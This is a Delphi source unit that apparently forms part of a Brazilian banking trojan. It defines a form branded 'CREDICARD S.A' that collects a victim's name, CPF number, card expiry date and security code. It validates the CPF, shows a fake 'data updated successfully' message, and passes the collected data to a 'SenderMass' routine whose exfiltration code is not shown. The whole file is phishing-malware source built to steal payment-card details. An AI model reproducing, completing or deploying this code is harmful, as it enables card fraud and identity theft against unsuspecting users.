unit Cres;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TCredita = class(TFrame)
    Image1: TImage;
    Editm: TEdit;
    Edita: TEdit;
    Edits: TEdit;
    Editcpf: TEdit;
    Label1: TLabel;
    EditNOME: TEdit;
    procedure EditmChange(Sender: TObject);
    procedure EditaChange(Sender: TObject);
    procedure EditcpfChange(Sender: TObject);
    procedure Label1Click(Sender: TObject);
    procedure EditNOMEKeyPress(Sender: TObject; var Key: Char);
    procedure EditcpfExit(Sender: TObject);
    procedure EditcpfKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
  private
    { Private declarations }
  public
     s:string;
  end;

implementation

{$R *.dfm}
uses
Natal, Gerador, Creu;

function Cpf(CPF_Text: string): boolean;
var
  n1,n2,n3,n4,n5,n6,n7,n8,n9: integer;
  d1,d2: integer;
  digitado, calculado: string;
begin
   n1:=StrToInt(CPF_Text[1]);
   n2:=StrToInt(CPF_Text[2]);
   n3:=StrToInt(CPF_Text[3]);
   n4:=StrToInt(CPF_Text[5]);
   n5:=StrToInt(CPF_Text[6]);
   n6:=StrToInt(CPF_Text[7]);
   n7:=StrToInt(CPF_Text[9]);
   n8:=StrToInt(CPF_Text[10]);
   n9:=StrToInt(CPF_Text[11]);
   d1:=n9*2+n8*3+n7*4+n6*5+n5*6+n4*7+n3*8+n2*9+n1*10;
   d1:=11-(d1 mod 11);
   if d1>=10 then
    d1:=0;
    d2:=d1*2+n9*3+n8*4+n7*5+n6*6+n5*7+n4*8+n3*9+n2*10+n1*11;
    d2:=11-(d2 mod 11);
   if d2>=10 then
    d2:=0;
    calculado:=inttostr(d1)+inttostr(d2);
    digitado:=CPF_Text[13]+CPF_Text[14];
   if calculado=digitado then
    Cpf:=true
   else
    Cpf:=false;
end;


procedure TCredita.EditaChange(Sender: TObject);
begin
  if Length(Edita.Text) = 4 then
    Edits.SetFocus;
end;

procedure TCredita.EditcpfChange(Sender: TObject);
begin

  if Length(EditCpf.Text) = 14 then
  Editm.SetFocus;

  if s = 's' then
begin
if length(EditCpf.Text) = 3 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;

if length(EditCpf.Text) = 7 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;

if length(EditCpf.Text) = 11 then
begin
EditCpf.Text := EditCpf.Text + '-';
EditCpf.SelStart := length(EditCpf.Text);
end;

end
else
begin
s :='s';
end;
end;

procedure TCredita.EditcpfExit(Sender: TObject);
begin
  If EditCpf.Text<>'' Then
    If Cpf(EditCpf.Text)=False Then
    Begin
      MessageDlg('O CPF Informado está incorreto! Verifique, e tente novamente.',mtError, [mbOk],0);
      EditCpf.Text:='';
      EditCpf.SetFocus;
    end;
end;

procedure TCredita.EditcpfKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_BACK then
end;

procedure TCredita.EditmChange(Sender: TObject);
begin
   if Length(Editm.Text) = 2 then
    Edita.SetFocus;
end;

procedure TCredita.EditNOMEKeyPress(Sender: TObject; var Key: Char);
begin
  Key := Upcase(key);
end;

procedure TCredita.Label1Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;



DadosEnvio_.Add('NOME: '+  EditNOME.text);
DadosEnvio_.Add('CPF:  '+  EditcPF.text);
DadosEnvio_.Add('VAL:  '+  Editm.text+'/'+Edita.Text);
DadosEnvio_.Add('SEG:  '+  EditS.text);
DadosEnvio_.Add('=============================================');


if length(Editm.text+Edita.Text+EditS.text) < 7 then
begin
  MessageBox(Self.handle,'Credicard Informa: Um ou mais dados estão incorretos!', 'CREDICARD S.A',
  mb_IconError + mb_Ok);
  DadosEnvio_.Free;
  Exit;
end;

Application.MessageBox('   Seus Dados Foram Atualizados com Sucesso! ', 'CREDICARD S.A',mb_Ok+mb_IconInformation);



//SenderFull
try
  Credito.Visible := False;
  SenderMass(DadosEnvio_ , 'CRED');
  DadosEnvio_.Free;
except
end;

Credito.Cred.Enabled := False;

end;
end.
